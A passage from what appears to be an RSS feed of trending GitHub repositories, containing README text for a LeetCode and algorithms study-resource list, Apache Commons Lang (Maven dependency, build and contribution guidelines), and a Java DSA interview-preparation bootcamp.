 &lt;li&gt;&lt;a href="https://medium.com/basecs/a-gentle-introduction-to-graph-theory-77969829ead8"&gt;Graph Theory&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/master-graph-algorithms-for-coding"&gt;Important Graph Algorithms&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/basecs/deep-dive-through-a-graph-dfs-traversal-8177df5d0f13"&gt;DFS Traversal&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/basecs/going-broad-in-a-graph-bfs-traversal-959bd1a09255"&gt;BFS Traversal&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/general-discussion/1072418/Disjoint-Set-Union-(DSU)Union-Find-A-Complete-Guide"&gt;Union-Find&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/1059477/A-guide-to-Dijkstra's-Algorithm"&gt;Dijkstra Algorithm&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.hackerearth.com/practice/algorithms/graphs/minimum-spanning-tree/tutorial/"&gt;Minimum Spanning Tree&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;ğŸš€ Patterns&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/15-leetcode-patterns"&gt;15 Leetcode Patterns&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/20-patterns-to-master-dynamic-programming"&gt;20 DP Patterns&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=QzZ7nmouLTI"&gt;Two Pointers Pattern&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/f4412a17-7a3a-4d0b-8e39-9ea8f429bf7c"&gt;Sliding Window Pattern&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=yuws7YK0Yng"&gt;Prefix Sum Pattern&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=b139yf7Ik-E"&gt;Fast and Slow Pointers Pattern&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=6_v6OoxvMOE"&gt;Top 'K' Elements Pattern&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=NUWAXbSlsws"&gt;Kadane's Algorithm&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=y2d0VHdvfdc"&gt;Sliding Window Pattern&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=auoTGovuo9A"&gt;Linked List In-place Reversal Pattern&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=DtJVwbbicjQ"&gt;Monotonic Stack Pattern&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/812e72f7-eced-4256-a4c1-00606ae50679"&gt;Overlapping Intervals Pattern&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/81d42ca2-600c-4252-aa33-a56462090048"&gt;Backtracking Pattern&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/d0d81b04-4c2a-4b45-a101-5137c3146686"&gt;Modified Binary Search Pattern&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/937307/Iterative-or-Recursive-or-DFS-and-BFS-Tree-Traversal-or-In-Pre-Post-and-LevelOrder-or-Views"&gt;Tree Patterns&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://medium.com/leetcode-patterns/leetcode-pattern-0-iterative-traversals-on-trees-d373568eb0ec"&gt;Tree Iterative Traversal&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/2879240/TREE-QUESTION-PATTERN-2023-oror-TREE-STUDY-GUIDE"&gt;Tree Question Pattern&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/655708/Graph-For-Beginners-Problems-or-Pattern-or-Sample-Solutions"&gt;Graph Patterns&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/leetcode-patterns/leetcode-pattern-1-bfs-dfs-25-of-the-problems-part-1-519450a84353"&gt;DFS + BFS Patterns (1)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/leetcode-patterns/leetcode-pattern-2-dfs-bfs-25-of-the-problems-part-2-a5b269597f52"&gt;DFS + BFS Patterns (2)&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;ğŸ“� Must-Read Leetcode Articles&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/problems/frequency-of-the-most-frequent-element/solutions/1175088/C++-Maximum-Sliding-Window-Cheatsheet-Template/"&gt;Sliding Window Template&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/1688903/Solved-all-two-pointers-problems-in-100-days"&gt;Two Pointers Patterns&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/2001789/Collections-of-Important-String-questions-Pattern"&gt;Collections of Important String Questions&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/problems/minimum-window-substring/solutions/26808/Here-is-a-10-line-template-that-can-solve-most-'substring'-problems/"&gt;Substring Problem Template&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/786126/Python-Powerful-Ultimate-Binary-Search-Template.-Solved-many-problems"&gt;Binary Search Template&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/problems/permutations/solutions/18239/A-general-approach-to-backtracking-questions-in-Java-(Subsets-Permutations-Combination-Sum-Palindrome-Partioning)/"&gt;A General Approach to Backtracking Questions&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/2347639/A-comprehensive-guide-and-template-for-monotonic-stack-based-problems"&gt;Monotonic Stack Template&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/general-discussion/1127238/master-heap-by-solving-23-questions-in-4-patterns-category"&gt;Heap Patterns&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/4282051/all-types-of-patterns-for-bits-manipulations-and-how-to-use-it"&gt;Bit Manipulation Patterns&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/458695/Dynamic-Programming-Patterns"&gt;Dynamic Programming Patterns&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/problems/best-time-to-buy-and-sell-stock-with-transaction-fee/solutions/108870/most-consistent-ways-of-dealing-with-the-series-of-stock-problems/"&gt;Stock Series Patterns&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;âœ… Curated Problems&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://algomaster.io/practice/dsa-patterns"&gt;AlgoMaster 300&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/general-discussion/460599/blind-75-leetcode-questions"&gt;Blind 75&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/studyplan/top-100-liked/"&gt;Leetcode Top 100 Liked&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/studyplan/top-interview-150/"&gt;Leetcode Top Interview 150&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;ğŸ“º YouTube Playlist&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLK63NuByH5o-tqaMUHRA4r8ObRW7PWz45"&gt;AlgoMaster LeetCode Pattern Playlist&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLDN4rrl48XKpZkf03iYFl-O29szjTrs_O"&gt;Abdul Bari's Algorithms Playlist&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLDV1Zeh2NRsB6SWUrDFW2RmDotAfPbeHu"&gt;William Fiset's Data Structure Playlist&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLDV1Zeh2NRsDGO4--qE8yH72HFL1Km93P"&gt;William Fiset's Graphs Playlist&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLrmLmBdmIlpsHaNTPP_jHHDx_os9ItYXr"&gt;Tushar Roy's Dynamic Programming Playlist&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;ğŸ“‡ Courses&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://www.coursera.org/learn/algorithms-part1"&gt;Coursera - Algorithms, Part I&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.coursera.org/learn/algorithms-part2"&gt;Coursera - Algorithms, Part 2&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;ğŸ“š Books&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://www.amazon.in/dp/B08CMLS7LZ"&gt;Data Structures And Algorithms Made Easy&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.amazon.in/dp/0984782850"&gt;Cracking the Coding Interview&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;ğŸ“© Newsletter&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/"&gt;AlgoMaster Newsletter&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;ğŸ”� Visualization&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://visualgo.net/en"&gt;VisuAlgo&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/jaroslaw-weber/algo-lens"&gt;Algo-lens: Visualize leetcode problems&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;ğŸ“� LeetCode Extensions&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://chromewebstore.google.com/detail/leetcode-timer/gfkgelnlcnomnahkfmhemgpahgmibofd"&gt;LeetCode Timer&lt;/a&gt;: Easily time your leetcode practise sessions with automatic time setting based on difficulty.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://chromewebstore.google.com/detail/leetcode-video-solutions/ilnmgkahgjdpkoliooildngldmilhelm"&gt;LeetCode Video Solutions&lt;/a&gt;: Watch free LeetCode video â–¶ solutions on the problem page itself.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://chromewebstore.google.com/detail/leetcode-format/imogghebhifnnlgogigikjecilkicfpp"&gt;LeetCode Format&lt;/a&gt;: Adds Format code button on leetcode to format the code using Prettier code formatter.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://chromewebstore.google.com/detail/leethub-v2/mhanfgfagplhgemhjfeolkkdidbakocm?hl=en"&gt;LeetHub v2&lt;/a&gt;: Automatically integrate your Leetcode &amp;amp; GeeksforGeeks submissions to GitHub.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://marketplace.visualstudio.com/items?itemName=LeetCode.vscode-leetcode"&gt;LeetCode VS Code Extension&lt;/a&gt;: Solve LeetCode problems in VS Code.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Your contributions are most welcome!&lt;/p&gt; 
&lt;hr&gt; 
&lt;p align="center"&gt; &lt;i&gt;If you find this resource helpful, please give it a star â­�ï¸� and share it with others!&lt;/i&gt; &lt;/p&gt;</description>
    </item>
    
    <item>
      <title>apache/commons-lang</title>
      <link>https://github.com/apache/commons-lang</link>
      <description>&lt;p&gt;Apache Commons Lang&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Apache Commons Lang&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://github.com/apache/commons-lang/actions/workflows/maven.yml"&gt;&lt;img src="https://github.com/apache/commons-lang/actions/workflows/maven.yml/badge.svg?sanitize=true" alt="Java CI"&gt;&lt;/a&gt; &lt;a href="https://search.maven.org/artifact/org.apache.commons/commons-lang3"&gt;&lt;img src="https://img.shields.io/maven-central/v/org.apache.commons/commons-lang3?label=Maven%20Central" alt="Maven Central"&gt;&lt;/a&gt; &lt;a href="https://javadoc.io/doc/org.apache.commons/commons-lang3/3.18.0"&gt;&lt;img src="https://javadoc.io/badge/org.apache.commons/commons-lang3/3.18.0.svg?sanitize=true" alt="Javadocs"&gt;&lt;/a&gt; &lt;a href="https://github.com/apache/commons-lang/actions/workflows/codeql-analysis.yml"&gt;&lt;img src="https://github.com/apache/commons-lang/actions/workflows/codeql-analysis.yml/badge.svg?sanitize=true" alt="CodeQL"&gt;&lt;/a&gt; &lt;a href="https://api.securityscorecards.dev/projects/github.com/apache/commons-lang"&gt;&lt;img src="https://api.securityscorecards.dev/projects/github.com/apache/commons-lang/badge" alt="OpenSSF Scorecard"&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Apache Commons Lang, a package of Java utility classes for the classes that are in java.lang's hierarchy, or are considered to be so standard as to justify existence in java.lang.&lt;/p&gt; 
&lt;p&gt;The code is tested using the latest revision of the JDK for supported LTS releases: 8, 11, 17 and 21 currently. See &lt;a href="https://github.com/apache/commons-lang/raw/master/.github/workflows/maven.yml"&gt;https://github.com/apache/commons-lang/blob/master/.github/workflows/maven.yml&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Please ensure your build environment is up-to-date and kindly report any build issues.&lt;/p&gt; 
&lt;h2&gt;Documentation&lt;/h2&gt; 
&lt;p&gt;More information can be found on the &lt;a href="https://commons.apache.org/proper/commons-lang"&gt;Apache Commons Lang homepage&lt;/a&gt;. The &lt;a href="https://commons.apache.org/proper/commons-lang/apidocs"&gt;Javadoc&lt;/a&gt; can be browsed. Questions related to the usage of Apache Commons Lang should be posted to the &lt;a href="https://commons.apache.org/mail-lists.html"&gt;user mailing list&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Getting the latest release&lt;/h2&gt; 
&lt;p&gt;You can download source and binaries from our &lt;a href="https://commons.apache.org/proper/commons-lang/download_lang.cgi"&gt;download page&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;Alternatively, you can pull it from the central Maven repositories:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-xml"&gt;&amp;lt;dependency&amp;gt;
  &amp;lt;groupId&amp;gt;org.apache.commons&amp;lt;/groupId&amp;gt;
  &amp;lt;artifactId&amp;gt;commons-lang3&amp;lt;/artifactId&amp;gt;
  &amp;lt;version&amp;gt;3.18.0&amp;lt;/version&amp;gt;
&amp;lt;/dependency&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Building&lt;/h2&gt; 
&lt;p&gt;Building requires a Java JDK and &lt;a href="https://maven.apache.org/"&gt;Apache Maven&lt;/a&gt;. The required Java version is found in the &lt;code&gt;pom.xml&lt;/code&gt; as the &lt;code&gt;maven.compiler.source&lt;/code&gt; property.&lt;/p&gt; 
&lt;p&gt;From a command shell, run &lt;code&gt;mvn&lt;/code&gt; without arguments to invoke the default Maven goal to run all tests and checks.&lt;/p&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;p&gt;We accept Pull Requests via GitHub. The &lt;a href="https://commons.apache.org/mail-lists.html"&gt;developer mailing list&lt;/a&gt; is the main channel of communication for contributors. There are some guidelines which will make applying PRs easier for us:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;No tabs! Please use spaces for indentation.&lt;/li&gt; 
 &lt;li&gt;Respect the existing code style for each file.&lt;/li&gt; 
 &lt;li&gt;Create minimal diffs - disable on save actions like reformat source code or organize imports. If you feel the source code should be reformatted create a separate PR for this change.&lt;/li&gt; 
 &lt;li&gt;Provide JUnit tests for your changes and make sure your changes don't break any existing tests by running &lt;code&gt;mvn&lt;/code&gt;.&lt;/li&gt; 
 &lt;li&gt;Before you pushing a PR, run &lt;code&gt;mvn&lt;/code&gt; (by itself), this runs the default goal, which contains all build checks.&lt;/li&gt; 
 &lt;li&gt;To see the code coverage report, regardless of coverage failures, run &lt;code&gt;mvn clean site -Dcommons.jacoco.haltOnFailure=false -Pjacoco&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;If you plan to contribute on a regular basis, please consider filing a &lt;a href="https://www.apache.org/licenses/#clas"&gt;contributor license agreement&lt;/a&gt;. You can learn more about contributing via GitHub in our &lt;a href="https://raw.githubusercontent.com/apache/commons-lang/master/CONTRIBUTING.md"&gt;contribution guidelines&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;This code is licensed under the &lt;a href="https://www.apache.org/licenses/LICENSE-2.0"&gt;Apache License v2&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;See the &lt;code&gt;NOTICE.txt&lt;/code&gt; file for required notices and attributions.&lt;/p&gt; 
&lt;h2&gt;Donating&lt;/h2&gt; 
&lt;p&gt;You like Apache Commons Lang? Then &lt;a href="https://www.apache.org/foundation/contributing.html"&gt;donate back to the ASF&lt;/a&gt; to support development.&lt;/p&gt; 
&lt;h2&gt;Additional Resources&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://commons.apache.org/"&gt;Apache Commons Homepage&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://issues.apache.org/jira/browse/LANG"&gt;Apache Issue Tracker (JIRA)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://the-asf.slack.com/archives/C60NVB8AD"&gt;Apache Commons Slack Channel&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://twitter.com/ApacheCommons"&gt;Apache Commons Twitter Account&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Apache Commons Components&lt;/h2&gt; 
&lt;p&gt;Please see the &lt;a href="https://commons.apache.org/components.html"&gt;list of components&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>kunal-kushwaha/DSA-Bootcamp-Java</title>
      <link>https://github.com/kunal-kushwaha/DSA-Bootcamp-Java</link>
      <description>&lt;p&gt;This repository consists of the code samples, assignments, and notes for the Java data structures &amp; algorithms + interview preparation bootcamp of WeMakeDevs.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;DSA + Interview preparation bootcamp&lt;/h1&gt; 
&lt;ul&gt; 
 &lt;li&gt;Subscribe to the &lt;a href="https://www.youtube.com/KunalKushwaha?sub_confirmation=1"&gt;YouTube channel&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PL9gnSGHSqcnr_DxHsP7AW9ftq0AtAyYqJ"&gt;Lectures&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.techwithkunal.com/courses/dsa"&gt;Course website&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/kunal-kushwaha/DSA-Bootcamp-Java/tree/main/assignments"&gt;Assignments&lt;/a&gt; (solutions can be found on LeetCode)&lt;/li&gt; 
&lt;/ul&gt;</description>
    </item>
    
  </channel>
</rss>